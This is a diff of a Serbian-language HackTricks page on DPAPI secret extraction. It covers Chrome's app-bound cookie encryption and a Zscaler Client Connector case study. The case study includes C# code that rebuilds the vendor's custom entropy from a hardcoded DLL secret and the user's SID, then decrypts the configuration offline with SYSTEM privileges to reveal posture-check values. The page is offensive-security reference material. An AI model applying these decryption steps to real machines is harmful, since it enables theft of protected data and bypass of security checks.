+* **Chrome 127 “App-Bound” cookie encryption** (July 2024) je zamenio nasleđenu zaštitu zasnovanu samo na DPAPI sa dodatnim ključem koji se čuva u korisnikovom **Credential Manager**. Offline dešifrovanje kolačića sada zahteva i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu povratiti dodatni ključ kada rade u kontekstu korisnika.
 
-### Studija slučaja: Zscaler Client Connector – Custom Entropy izvedena iz SID
 
-Zscaler Client Connector čuva nekoliko konfiguracionih fajlova pod `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaki fajl je enkriptovan sa **DPAPI (Machine scope)**, ali vendor obezbeđuje **custom entropy** koja se *izračunava u runtime-u* umesto da bude sačuvana na disku.
+### Studija slučaja: Zscaler Client Connector – prilagođena entropija izvedena iz SID-a
+
+Zscaler Client Connector čuva nekoliko konfiguracionih fajlova pod `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaki fajl je enkriptovan pomoću **DPAPI (Machine scope)**, ali dobavljač obezbeđuje **prilagođenu entropiju** koja se *izračunava pri izvršavanju* umesto da se čuva na disku.
 
 Entropija se rekonstruiše iz dva elementa:
 
-1. Hard-kodovani tajni podatak ugrađen unutar `ZSACredentialProvider.dll`.
+1. Hard-kodirana tajna ugrađena unutar `ZSACredentialProvider.dll`.
 2. **SID** Windows naloga kojem konfiguracija pripada.
 
-Algoritam koji DLL implementira je ekvivalentan:
+Algoritam koji implementira DLL je ekvivalentan:
 ```csharp
 byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
 byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
@@ -323,17 +406,17 @@ byte[] entropy = new byte[tmp.Length / 2];
 for (int i = 0; i < entropy.Length; i++)
 entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
 ```
-Pošto je tajna ugrađena u DLL koji se može pročitati sa diska, **bilo koji lokalni napadač sa SYSTEM privilegijama može ponovo generisati entropiju za bilo koji SID** i decrypt the blobs offline:
+Pošto je tajna ugrađena u DLL koja se može pročitati sa diska, **bilo koji lokalni napadač sa SYSTEM privilegijama može regenerisati entropiju za bilo koji SID** i dekriptovati blobove offline:
 ```csharp
 byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
 byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
 Console.WriteLine(Encoding.UTF8.GetString(clear));
 ```
-Dešifrovanje daje kompletnu JSON konfiguraciju, uključujući svaki **device posture check** i njegovu očekivanu vrednost — informacije koje su veoma vredne pri pokušajima zaobilaženja na klijentskoj strani.
+Dešifrovanje daje kompletnu JSON konfiguraciju, uključujući svaku **proveru statusa uređaja** i njenu očekivanu vrednost — informacije koje su veoma vredne pri pokušajima zaobilaženja na strani klijenta.
 
-> SAVET: drugi šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) su zaštićeni sa DPAPI **bez** entropije (`16` zero bytes). Stoga se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` jednom kada se dobiju SYSTEM privilegije.
+> TIP: ostali šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) su zaštićeni pomoću DPAPI **bez** entropije (`16` nul bajtova). Stoga se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` nakon što se dobiju SYSTEM privilegije.
 
-## Reference
+## References
 
 - [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
@@ -345,5 +428,8 @@ Dešifrovanje daje kompletnu JSON konfiguraciju, uključujući svaki **device po
 - [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
 - [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
 - [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
+- [Impacket – dpapi.py](https://github.com/fortra/impacket)
+- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)
 
 {{#include ../../banners/hacktricks-training.md}}
